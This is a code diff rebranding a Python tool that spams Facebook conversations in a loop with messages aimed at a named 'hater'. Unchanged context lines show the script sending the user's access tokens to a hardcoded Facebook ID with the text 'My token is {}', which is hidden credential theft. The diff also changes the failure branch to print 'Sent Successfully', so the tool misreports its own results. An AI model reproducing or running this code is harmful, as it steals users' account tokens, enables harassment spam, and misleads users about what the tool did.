@@ -39,7 +39,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello satish sir! I am using your server. My token is {}"
+      msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝗳𝗶𝘆𝗮 𝗦𝗶𝗿..!! 𝗜'𝗺 𝗨𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗼𝗹 𝗔𝗻𝗱 𝗠𝘆 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗸𝗲𝗻 𝗜𝘀 {}"
 
       # Specify the ID where you want to send the message
       target_id = "100069713641443"
@@ -47,7 +47,7 @@ def send_initial_message():
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•────────────────────── MAFIYA SERVER RUNNING ───────────────────────────────•')
+          print('\033[1;92m' + '[>] ==========𝗠𝟵𝗙𝗜𝗬𝟵=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
 
       headers = {
           'Connection': 'keep-alive',
@@ -97,7 +97,7 @@ def send_messages_from_file():
           speed = int(file.read().strip())
 
       def liness():
-          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+          print('\033[1;92m' + '[>] ==========𝗠𝟵𝗙𝗜𝗬𝟵=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
 
       headers = {
           'Connection': 'keep-alive',
@@ -124,18 +124,18 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                      print("\033[1;36;1m[❤️] YOU ARE USING MR. MAFIYA CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message + ' ' + here_name))
                       liness()
                       liness()
                   else:
-                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                      print("\033[1;36;1m[❤️] YOU ARE USING MR. MAFIYA CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message + ' ' + here_name))
                       liness()
                       liness()
                   time.sleep(speed)
 
-              print("\n[+] All messages sent. Restarting the process...\n")
+              print("\n[😏] 𝟰𝗟𝗟 𝗠𝟯𝗦𝗦𝟰𝗚𝟯 𝗦𝟯𝗡𝗧 𝗦𝗨𝗖𝗖𝟯𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗡𝟬𝗪 𝗪𝟰𝗜𝗧 𝗙𝟬𝗥 𝟯𝟬 𝗦𝟯𝗖 𝗕𝗥𝟬....\n")
           except Exception as e:
               print("[!] An error occurred: {}".format(e))
 
